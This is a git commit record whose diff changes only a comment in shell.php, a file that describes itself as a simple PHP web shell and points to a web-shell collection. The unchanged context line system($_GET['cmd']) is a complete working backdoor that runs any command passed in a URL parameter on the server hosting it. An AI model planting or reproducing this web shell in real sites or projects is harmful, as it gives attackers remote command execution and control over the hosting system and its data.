3def2a3db144e6c1385d6aa694921b8c0c0585af
LinuxPAL <124550381+LinuxPAL@users.noreply.github.com>
2023-02-06 06:14:55 +0100

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,6 +1,6 @@
 <?php
 
-// This is a simple PHP web shell.
+// This is a simple PHP web shell..
 // For more, you can visit the PHP directory at https://github.com/TheBinitGhimire/Web-Shells!
 
 system($_GET['cmd']);
